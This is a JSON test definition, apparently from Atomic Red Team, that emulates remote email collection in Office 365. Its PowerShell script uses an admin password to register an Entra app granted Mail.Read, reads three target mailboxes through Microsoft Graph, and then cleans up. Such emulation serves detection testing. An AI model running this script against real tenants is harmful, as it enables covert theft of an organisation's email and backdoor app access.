{
    "name": "Office365 - Remote Mail Collected",
    "description": "Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information.  ",
    "supported_platforms": [
        "windows"
    ],
    "input_arguments": {
        "username": {
            "description": "Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All and Application.ReadWrite.All Scope (eg, Global Administrator Role) and sign-in method is password",
            "type": "string",
            "default": null
        },
        "password": {
            "description": "Entra user password",
            "type": "string",
            "default": null
        },
        "1st_target_mailbox": {
            "description": "office-365 target_email_address",
            "type": "string",
            "default": null
        },
        "2nd_target_mailbox": {
            "description": "office-365 target_email_address",
            "type": "string",
            "default": null
        },
        "3rd_target_mailbox": {
            "description": "office-365 target_email_address",
            "type": "string",
            "default": null
        }
    },
    "dependency_executor_name": "powershell",
    "dependencies": [
        {
            "description": "Microsoft Graph PowerShell SDK must be installed.\n",
            "prereq_command": "$RequiredModule = Get-InstalledModule Microsoft.Graph\nif (-not $RequiredModule) {exit 1} else {exit 0}\n",
            "get_prereq_command": "Install-Module Microsoft.Graph -Scope CurrentUser\n"
        },
        {
            "description": "Az.Accounts module must be installed.\n",
            "prereq_command": "$RequiredModule2 = Get-InstalledModule Az.Accounts\nif (-not $RequiredModule2) {exit 1} else {exit 0}\n",
            "get_prereq_command": "Install-Module Az.Accounts -Scope CurrentUser\n"
        }
    ],
    "executor": {
        "command": "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2 = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n",
        "cleanup_command": "connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome\nRemove-MgApplication $app.AppId\nRemove-Item -Path Cert:\\CurrentUser\\My\\$($cert.thumbprint) -DeleteKey\nDisconnect-MgGraph\n",
        "name": "powershell",
        "elevation_required": false,
        "type": "Command Executor"
    },
    "id": "T1114.002",
    "tactics": [
        "Collection"
    ],
    "technique": "Email Collection: Remote Email Collection",
    "arguments": {
        "username": {
            "description": "Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All and Application.ReadWrite.All Scope (eg, Global Administrator Role) and sign-in method is password",
            "type": "string",
            "default": null
        },
        "password": {
            "description": "Entra user password",
            "type": "string",
            "default": null
        },
        "1st_target_mailbox": {
            "description": "office-365 target_email_address",
            "type": "string",
            "default": null
        },
        "2nd_target_mailbox": {
            "description": "office-365 target_email_address",
            "type": "string",
            "default": null
        },
        "3rd_target_mailbox": {
            "description": "office-365 target_email_address",
            "type": "string",
            "default": null
        }
    },
    "preconditions": [
        {
            "description": "Microsoft Graph PowerShell SDK must be installed.\n",
            "prereq_command": "$RequiredModule = Get-InstalledModule Microsoft.Graph\nif (-not $RequiredModule) {exit 1} else {exit 0}\n",
            "get_prereq_command": "Install-Module Microsoft.Graph -Scope CurrentUser\n"
        },
        {
            "description": "Az.Accounts module must be installed.\n",
            "prereq_command": "$RequiredModule2 = Get-InstalledModule Az.Accounts\nif (-not $RequiredModule2) {exit 1} else {exit 0}\n",
            "get_prereq_command": "Install-Module Az.Accounts -Scope CurrentUser\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim",
    "source": "ART",
    "uuid": "36657d95-d9d6-4fbf-8a31-f4085607bafd"
}